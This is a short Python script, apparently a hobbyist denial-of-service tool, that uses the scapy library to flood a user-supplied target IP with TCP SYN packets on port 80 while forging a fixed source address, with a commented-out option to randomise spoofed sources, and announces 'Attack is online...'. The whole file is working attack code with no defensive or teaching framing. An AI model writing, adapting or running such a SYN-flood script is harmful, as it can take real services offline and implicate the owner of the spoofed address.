from scapy.all import *
from random import getrandbits
target = input("Type here the target ip: ")
x = "182.21.20.32"
port = 80
ip = IP(src=x, dst=target)
#ip = IP(src=RandIP(f"{target}/24"), dst=target)
tcp=TCP(sport=RandShort(), dport=port, flags="S", seq=100)
raw = Raw(b"Cyka")
p = ip / tcp / raw
srloop(p, verbose=0, inter=0.03)
print("Attack is online...")
